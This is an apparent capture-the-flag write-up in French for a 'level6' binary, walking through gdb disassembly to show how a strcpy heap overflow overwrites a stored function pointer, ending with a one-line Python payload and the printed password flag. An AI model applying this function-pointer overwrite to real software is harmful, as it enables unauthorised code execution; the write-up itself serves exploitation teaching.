# Malloc Buffer Exploitation

En décompilant l'exécutable, on remarque qu'il :
1. alloue de la mémoire avec `malloc`.
2. y stocke l'adresse de la fonction `m` dans une des allocations.
3. appelle la fonction `m` grâce à l'adresse stockée dans l'allocation mémoire.

On remarque aussi la présence d'une fonction `n` qui affiche le contenu du fichier `.pass` à l'aide de la fonction `cat`. L'objectif ici est clair, remplacer l'adresse de la fonction `m`, contenue à l'adresse allouée par `malloc`, par l'adresse de la fonction `n`. Ainsi, nous serons en mesure d'afficher le fichier `.pass`.

Pour commencer, nous allons voir où `malloc` alloue de l'espace dans la mémoire. Pour illustrer nos explications, nous allons lancer notre exécutable avec `gdb` en prenant en argument une chaine de caractères contenant `64` caractères `A`, soit la taille en octets allouée par le premier `malloc`.
```
> gdb --args level6 "AAAA"
[...]
> (gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:	push   %ebp
   0x0804847d <+1>:	mov    %esp,%ebp
   0x0804847f <+3>:	and    $0xfffffff0,%esp
   0x08048482 <+6>:	sub    $0x20,%esp
   0x08048485 <+9>:	movl   $0x40,(%esp)
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
   0x08048495 <+25>:	movl   $0x4,(%esp)
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
   0x080484a5 <+41>:	mov    $0x8048468,%edx
   0x080484aa <+46>:	mov    0x18(%esp),%eax
   0x080484ae <+50>:	mov    %edx,(%eax)
   0x080484b0 <+52>:	mov    0xc(%ebp),%eax
   0x080484b3 <+55>:	add    $0x4,%eax
   0x080484b6 <+58>:	mov    (%eax),%eax
   0x080484b8 <+60>:	mov    %eax,%edx
   0x080484ba <+62>:	mov    0x1c(%esp),%eax
   0x080484be <+66>:	mov    %edx,0x4(%esp)
   0x080484c2 <+70>:	mov    %eax,(%esp)
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    0x18(%esp),%eax
   0x080484ce <+82>:	mov    (%eax),%eax
   0x080484d0 <+84>:	call   *%eax
   0x080484d2 <+86>:	leave  
   0x080484d3 <+87>:	ret    
End of assembler dump.
```
On sait que la fonction `malloc` nous retourne un pointeur vers l'emplacement alloué. Nous allons donc `break` sur chaque instruction suivant un appel à `malloc`, soit `+21` et `+37`.
```
> (gdb) b *0x08048491
Breakpoint 1 at 0x8048491
> (gdb) b *0x080484a1
Breakpoint 2 at 0x80484a1
```
On `run`, puis on imprime `eax` pour afficher l'adresse retourné par `malloc`.
```
> (gdb) r
Starting program: /home/user/level6/level6 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048491 in main ()
> (gdb) x $eax
0x804a008:	0x00000000
> (gdb) c
Continuing.

Breakpoint 2, 0x080484a1 in main ()
> (gdb) x $eax
0x804a050:	0x00000000
```
Grace à `gdb`, on connait donc l'emplacement mémoire où sera copié notre premier argument, et l'adresse où sera stockée l'adresse de `m`.

**Adresse allouée de la copie du premier argument**
```
0x804a008
```
**Adresse allouée pour la fonction `m`**
```
0x804a050
```

Pour le démontrer, on peut afficher la stack après l'appel à `strcpy`. On `break` donc à `+78` et on récupère au préalable l'adresse de la fonction `m` pour la visualiser dans la stack.
```
> (gdb) x m
0x8048468 <m>:	0x83e58955
> (gdb) b *0x080484ca
Breakpoint 3 at 0x80484ca
> (gdb) c
Continuing.

Breakpoint 3, 0x080484ca in main ()
> (gdb) x/20wx 0x804a008
0x804a008:	0x41414141	0x41414141	0x41414141	0x41414141
            ^
            début de la chaine
            de caractères
0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a048:	0x00000000	0x00000011	0x08048468	0x00000000
                                    ^
                                    adresse de m
```
On comprend avec cette visualiation, qu'en copiant un certain nombre de caractères dans notre permier espace alloué par `malloc`, nous serons en mesure d'écraser l'adresse de `m`, pour la remplacer par l'adresse de `n`. Ici, nous aurons besoin de `72` caractères pour remplir notre espace alloué juste avant l'emplacement de l'adresse de `m`.

On peut déterminer l'adresse de `n` simplement avec la commande suivante :
```
> (gdb) p n
$1 = {<text variable, no debug info>} 0x8048454 <n>
```
L'adresse de `n` est donc `0x8048454`. En `little-endian`, on obtient `\x54\x84\x04\x08`.

On peut donc exécuter la commande suivante :
```
> ./level6 `python -c 'print "A"*72 + "\x54\x84\x04\x08"'`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
Le programme fait maintenant appel à la fonction `n` qui imprime le contenu du fichier `.pass`.
